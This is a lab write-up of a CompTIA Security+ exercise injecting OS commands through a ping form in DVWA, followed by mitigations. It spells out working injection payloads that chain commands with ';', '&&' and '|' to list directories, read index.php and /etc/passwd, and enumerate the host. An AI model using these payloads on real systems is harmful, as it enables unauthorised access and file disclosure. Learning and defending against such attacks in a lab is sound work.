# Lab: Command Injection

**Source:** CompTIA Security+ CertMaster Labs (Section 15.3.5 — Performing Penetration Testing)
**Environment:** DVWA (Damn Vulnerable Web Application) on Kali Linux
**Technique:** OS Command Injection
**OWASP Category:** A03 — Injection
**Status:** ✅ Complete

---

## Scenario

A web application exposed a ping utility through a web input form, accepting an IP address from the user. The objective was to test whether the application sanitised user input before passing it to the underlying operating system, and if not, to demonstrate the extent of system access achievable through command injection.

---

## What is Command Injection?

Command injection occurs when an application passes unsanitised user input to a system shell. An attacker can append additional OS commands using separator characters (`;`, `&&`, `|`) to execute arbitrary commands on the host system — not just within the web application, but against the underlying operating system itself.

---

## Methodology

### Step 1 — Confirming Normal Functionality

Entered a valid IP address to confirm the application executes a ping:

```
10.1.16.66
```
Result: Standard ping output with four replies — application is executing `ping 10.1.16.66` on the OS.

---

### Step 2 — Testing for Injection

**Semi-colon separator test:**
```
127.0.0.1; ls -la
```
Result: Ping output followed by directory listing of the web root — **command injection confirmed.**

The application is constructing a command like: `ping [user_input]` with no sanitisation, so the injected `;ls -la` executes as a second command.

---

### Step 3 — Enumerating the Target System

**Double ampersand (AND) operator:**
```
127.0.0.1 && cat index.php
```
Result: Ping output followed by contents of `index.php` — source code of the page exposed.

**Listing web root:**
```
; ls -la source
```
Result: Contents of the source directory displayed.

**Traversing to parent directory:**
```
; ls -la ..
```
Result: Parent folder of the web root listed — directory structure mapped.

**Full system enumeration:**
```
; whoami; hostname; ip a; pwd; uptime
```
Result: User context (`www-data`), hostname, IP interfaces, working directory, and system uptime all returned in a single injection.

---

### Step 4 — Reading Sensitive Files

**Accessing `/etc/passwd`:**
```
| cat /etc/passwd
```
Result: Full contents of `/etc/passwd` displayed — all system user accounts exposed.

**Multi-level directory traversal combined with injection:**
```
; ls ../; echo ...; ls ../../; echo ...; ls ../../../
```
Result: Progressive directory listing from web root up to filesystem root — complete directory tree mapped.

---

## Commands & Separators Used

| Separator | Behaviour | Example |
|-----------|-----------|---------|
| `;` | Always executes second command | `127.0.0.1; ls` |
| `&&` | Executes second command only if first succeeds | `127.0.0.1 && cat index.php` |
| `\|` | Pipes output of first command to second | `127.0.0.1 \| cat /etc/passwd` |

---

## Information Gathered

| Data Point | Method | Value |
|-----------|--------|-------|
| Web user context | `whoami` | `www-data` |
| Hostname | `hostname` | Target system name |
| IP interfaces | `ip a` | Network configuration |
| Working directory | `pwd` | Web root path |
| OS user accounts | `cat /etc/passwd` | Full user list |
| Directory structure | `ls` traversal | Web root and parent directories |

---

## Impact Assessment

Through command injection alone, an attacker operating as `www-data` could:
- Map the full directory structure of the server
- Read any file accessible to the web user (configs, credentials, source code)
- Enumerate network interfaces for lateral movement planning
- Use this foothold to upload malicious files or establish persistence

---

## Defensive Recommendations

| Control | Description |
|---------|-------------|
| Input validation | Whitelist only valid IP address formats — reject everything else |
| Parameterised functions | Use language-level ping libraries instead of shell execution |
| Disable shell execution | Avoid `exec()`, `system()`, `shell_exec()` in web application code |
| Least privilege | Web server user (`www-data`) should have no shell access and minimal file permissions |
| WAF rules | Detect and block common injection separators in web input fields |

---

## Key Takeaway

This lab demonstrates that command injection is not just a web application problem — it's a direct bridge from the web tier to the underlying operating system. A single unsanitised input field gave full OS-level enumeration capability. The `www-data` user context limits the blast radius, but as the next lab demonstrates, it is sufficient to upload a web shell and escalate further.

---

*Write-up by Lereko Mohlomi | [LinkedIn](https://www.linkedin.com/in/lereko-mohlomi/)*
